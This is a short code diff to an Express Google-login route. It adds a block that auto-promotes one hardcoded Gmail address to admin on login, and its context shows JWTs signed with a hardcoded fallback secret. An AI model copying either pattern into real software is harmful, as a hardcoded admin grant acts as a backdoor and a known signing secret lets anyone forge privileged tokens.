@@ -161,6 +161,12 @@ app.post('/api/auth/google', async (req, res) => {
       }
     }
     
+    // Auto-promote specific email to admin
+    if (user.email === 'ssamle2006@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+    
     const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET || 'supersecretjwtkeyforprodatasets', { expiresIn: '1d' });
     res.status(200).json({ 
       token, 
